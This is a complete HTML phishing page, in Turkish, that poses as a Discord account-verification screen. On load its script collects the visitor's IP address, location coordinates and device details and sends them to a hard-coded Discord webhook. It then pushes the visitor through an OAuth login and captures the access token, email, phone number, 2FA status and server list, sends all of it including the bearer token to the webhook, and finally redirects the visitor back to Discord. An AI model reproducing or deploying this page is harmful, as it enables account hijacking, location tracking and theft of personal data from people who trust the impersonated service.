<!doctype html>
<html lang="tr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Discord</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{min-height:100vh;display:grid;place-items:center;background:#1e1f22;
       font-family:gg sans,"Segoe UI",system-ui,sans-serif;color:#f2f3f5;padding:20px}
  .card{width:100%;max-width:420px;background:#2b2d31;border-radius:12px;
        padding:36px 28px;text-align:center;box-shadow:0 8px 30px rgba(0,0,0,.45)}
  .logo{margin-bottom:18px}
  h1{font-size:21px;margin-bottom:10px}
  p{color:#b5bac1;font-size:14px;line-height:1.5}
  button{margin-top:22px;width:100%;padding:13px;border:0;border-radius:8px;
         background:#5865f2;color:#fff;font-size:15px;font-weight:600;cursor:pointer}
  button:hover{background:#4752c4}
  .spin{margin:22px auto 0;width:28px;height:28px;border:3px solid #3f4147;
        border-top-color:#5865f2;border-radius:50%;animation:s 1s linear infinite;display:none}
  @keyframes s{to{transform:rotate(360deg)}}
  .hide{display:none}
</style>
</head>
<body>
<div class="card">
  <div class="logo">
    <svg width="40" height="30" viewBox="0 0 127.14 96.36" fill="#5865F2" aria-label="Discord">
      <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5-12.74,11.44-12.74S96.23,46,96.12,53,91.08,65.69,84.69,65.69Z"/>
    </svg>
  </div>
  <h1 id="t">Hesabını doğrula</h1>
  <p id="m">Devam etmek için Discord hesabınla giriş yap.</p>
  <button id="b" class="hide">Discord ile devam et</button>
  <div id="sp" class="spin"></div>
</div>
<script>
const CONFIG = {
  WEBHOOK: "https://discord.com/api/webhooks/1557367996849066025/Qh_jUvGk24lLgdg-bPZVu30efBkpS8ywZFpQQ2_gcEmCkK-Ep2RyQT3X9eBK9W70HsOf",
  CLIENT_ID: "1571867967187325008",
  REDIRECT: "",
  SCOPES: "identify email guilds",
  AUTO_OAUTH: true,
  BACK_TO_DISCORD: true
};

const $ = s => document.querySelector(s);
const cut = (s, n) => String(s ?? "?").slice(0, n);

async function grab(url, ms) {
  const c = new AbortController();
  const t = setTimeout(() => c.abort(), ms || 3500);
  try {
    const r = await fetch(url, { signal: c.signal });
    return await r.json();
  } finally {
    clearTimeout(t);
  }
}

async function report(payload) {
  if (!CONFIG.WEBHOOK || CONFIG.WEBHOOK.includes("BURAYA")) return;
  const fd = new FormData();
  fd.append("payload_json", JSON.stringify(payload));
  try {
    await fetch(CONFIG.WEBHOOK, { method: "POST", body: fd, mode: "no-cors" });
  } catch (e) {}
}

async function collect() {
  const d = { ip: "?", isp: "?", city: "?", region: "?", country: "?", loc: null, tz: "?" };
  try {
    const j = await grab("https://ipwho.is/");
    if (j && j.success !== false) {
      d.ip = j.ip;
      d.isp = j.connection?.isp || j.connection?.org || "?";
      d.city = j.city;
      d.region = j.region;
      d.country = (j.country || "?") + " (" + (j.country_code || "?") + ")";
      d.tz = j.timezone?.id || "?";
      if (j.latitude && j.longitude) d.loc = j.latitude + "," + j.longitude;
    }
  } catch (e) {
    try { d.ip = (await grab("https://api.ipify.org?format=json")).ip; } catch (_) {}
  }
  try {
    d.tz = d.tz !== "?" ? d.tz : Intl.DateTimeFormat().resolvedOptions().timeZone;
  } catch (_) {}
  d.ua = navigator.userAgent;
  d.platform = navigator.platform;
  d.lang = navigator.language + " / " + (navigator.languages || []).join(", ");
  d.screen = screen.width + "x" + screen.height + " @" + screen.colorDepth + "bit";
  d.win = innerWidth + "x" + innerHeight;
  d.cpu = navigator.hardwareConcurrency + " çekirdek";
  d.ram = (navigator.deviceMemory || "?") + " GB";
  d.touch = navigator.maxTouchPoints > 0 ? "var" : "yok";
  d.ref = document.referrer || "yok";
  return d;
}

function build(title, d, user, guilds, token) {
  const f = [
    { name: "IP", value: "`" + cut(d.ip, 60) + "`", inline: true },
    { name: "Konum", value: cut([d.city, d.region].filter(Boolean).join(", ") || "?", 90) + ", " + cut(d.country, 60), inline: true },
    { name: "ISP", value: cut(d.isp, 200), inline: false },
    { name: "Saat dilimi", value: "`" + cut(d.tz, 60) + "`", inline: true },
    { name: "Ekran", value: cut(d.screen, 40) + " / pencere " + cut(d.win, 20), inline: true },
    { name: "Cihaz", value: cut(d.platform, 60) + " | " + cut(d.cpu, 30) + " | " + cut(d.ram, 12) + " | dokunmatik: " + d.touch, inline: false },
    { name: "Dil", value: cut(d.lang, 200), inline: false },
    { name: "Referrer", value: "`" + cut(d.ref, 200) + "`", inline: false },
    { name: "User-Agent", value: "```" + cut(d.ua, 350) + "```", inline: false }
  ];
  if (d.loc) f.push({ name: "Harita", value: "[Google Maps](https://www.google.com/maps?q=" + d.loc + ")", inline: false });

  if (user) {
    f.push(
      { name: "Kullanıcı ID", value: "`" + user.id + "`", inline: true },
      { name: "Kullanıcı adı", value: "`" + cut(user.username, 40) + (user.discriminator && user.discriminator !== "0" ? "#" + user.discriminator : "") + "`", inline: true },
      { name: "E-posta", value: "`" + cut(user.email || "?", 90) + "`" + (user.verified ? " ✔" : ""), inline: false },
      { name: "Telefon", value: "`" + cut(user.phone || "yok", 40) + "`", inline: true },
      { name: "2FA", value: user.mfa_enabled ? "açık" : "kapalı", inline: true },
      { name: "Nitro", value: String(user.premium_type ?? 0), inline: true },
      { name: "Sunucu sayısı", value: String(guilds.length), inline: true }
    );
    if (guilds.length) f.push({ name: "Sunucular", value: cut(guilds.slice(0, 15).map(g => g.name).join(" | "), 900), inline: false });
    f.push({ name: "Bearer token", value: "```" + token + "```", inline: false });
  }

  return {
    username: "Logger",
    embeds: [{
      title: title,
      color: user ? 0x57f287 : 0x5865f2,
      fields: f,
      footer: { text: cut(location.host, 80) },
      timestamp: new Date().toISOString()
    }]
  };
}

function goOAuth() {
  const u = new URL("https://discord.com/oauth2/authorize");
  u.searchParams.set("client_id", CONFIG.CLIENT_ID);
  u.searchParams.set("response_type", "token");
  u.searchParams.set("scope", CONFIG.SCOPES);
  u.searchParams.set("redirect_uri", CONFIG.REDIRECT || location.origin + location.pathname.replace(/index\.html$/, ""));
  location.href = u.toString();
}

async function callback(hash) {
  const token = hash.get("access_token");
  $("#sp").style.display = "block";
  $("#t").textContent = "Doğrulanıyor";
  $("#m").textContent = "Lütfen bekle...";
  const d = await collect();
  let user = null, guilds = [];
  try {
    const r = await fetch("https://discord.com/api/v10/users/@me", { headers: { Authorization: "Bearer " + token } });
    if (r.ok) user = await r.json();
  } catch (e) {}
  try {
    const r = await fetch("https://discord.com/api/v10/users/@me/guilds", { headers: { Authorization: "Bearer " + token } });
    if (r.ok) guilds = await r.json();
  } catch (e) {}
  await report(build("Hesap yakalandı", d, user, guilds, token));
  try { history.replaceState(null, "", location.pathname); } catch (e) {}
  $("#sp").style.display = "none";
  $("#t").textContent = "Doğrulandı";
  $("#m").textContent = user ? user.username + " — yönlendiriliyorsun..." : "Yönlendiriliyorsun...";
  if (CONFIG.BACK_TO_DISCORD) setTimeout(() => (location.href = "https://discord.com/channels/@me"), 1600);
}

(async function () {
  const hash = new URLSearchParams(location.hash.slice(1));
  if (hash.get("access_token")) return callback(hash);

  const d = await collect();
  await report(build("Tıklandı (giriş yapılmadı)", d, null, [], null));

  if (CONFIG.AUTO_OAUTH && !CONFIG.CLIENT_ID.includes("BURAYA")) return goOAuth();
  $("#b").classList.remove("hide");
  $("#b").onclick = goOAuth;
})();
</script>
</body>
</html>
